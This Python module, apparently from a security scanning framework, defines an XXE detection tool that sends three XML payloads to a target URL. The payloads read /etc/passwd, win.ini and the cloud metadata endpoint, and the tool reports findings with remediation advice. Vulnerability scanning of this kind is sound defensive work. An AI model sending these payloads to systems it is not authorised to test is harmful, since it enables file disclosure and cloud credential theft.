#!/usr/bin/env python3
"""
NEXUS-STRIKE — webapp.xxe
Domain: webapp
Real XXE detection: sends XXE payload to detected XML parsers, detects error-based XXE.
"""
from __future__ import annotations
import urllib.request
import urllib.parse
import ssl
from typing import Any
from nexus.foundation.schema import Finding, STATUS_COMPLETED, STATUS_NO_FINDINGS, STATUS_FAILED, tool_result
from nexus.tools.registry import tool_registry

XXE_PAYLOADS = [
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><test>&xxe;</test>'
]

def run(target: str, **kwargs: Any) -> dict:
    """Perform XML External Entity (XXE) injection testing."""
    findings = []
    vuln_indicators = []
    
    try:
        url = target if "://" in target else f"http://{target}"
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        for payload in XXE_PAYLOADS:
            try:
                req = urllib.request.Request(
                    url,
                    data=payload.encode('utf-8'),
                    headers={
                        "User-Agent": "NEXUS-STRIKE/0.2.0 (XXE Detector)",
                        "Content-Type": "application/xml"
                    },
                    method="POST"
                )
                resp = urllib.request.urlopen(req, timeout=10, context=ctx)
                body = resp.read(65536).decode("utf-8", errors="replace")
                
                # Check for common XXE error patterns or leaked file contents
                if "root:x:" in body or "for 16-bit app support" in body or "ami-id" in body.lower():
                    vuln_indicators.append({"payload": payload[:50], "evidence": "File content leaked in response"})
                    findings.append(Finding(
                        title="XML External Entity (XXE) Injection Vulnerability",
                        severity="critical",
                        confidence="high",
                        affected_asset=url,
                        evidence=f"Payload triggered file disclosure. Snippet: {payload[:60]}...",
                        remediation="Disable external entity processing in the XML parser. Use a parser that does not resolve external entities.",
                        tool="webapp.xxe",
                        references=["CWE-611", "OWASP-A05"]
                    ))
                    break
            except urllib.error.HTTPError as e:
                error_body = e.read(65536).decode("utf-8", errors="replace") if e.fp else ""
                if "entity" in error_body.lower() or "parse" in error_body.lower():
                    vuln_indicators.append({"payload": payload[:50], "evidence": "XML parsing error detected"})
                    findings.append(Finding(
                        title="Potential XXE via Error Message",
                        severity="medium",
                        confidence="medium",
                        affected_asset=url,
                        evidence=f"XML parsing error triggered by payload, indicating potential XXE susceptibility.",
                        remediation="Disable external entity processing and suppress detailed XML parser error messages.",
                        tool="webapp.xxe",
                        references=["CWE-611", "OWASP-A05"]
                    ))
                    break
            except Exception:
                pass
                
        summary = f"XXE testing completed. Found {len(vuln_indicators)} potential vulnerabilities."
        status = STATUS_COMPLETED if vuln_indicators else STATUS_NO_FINDINGS
        
    except Exception as e:
        return tool_result("webapp.xxe", target, status=STATUS_FAILED, error=str(e))

    return tool_result(
        "webapp.xxe", target,
        status=status,
        findings=findings,
        summary=summary,
        metadata={"vulnerabilities": vuln_indicators}
    )

tool_registry.register("webapp.xxe", run, metadata={
    "name": "webapp.xxe",
    "domain": "webapp",
    "status": "completed",
    "description": "XML External Entity (XXE) injection detection via error-based and file disclosure payloads",
    "parameters": {"target": "Target URL accepting XML input"},
})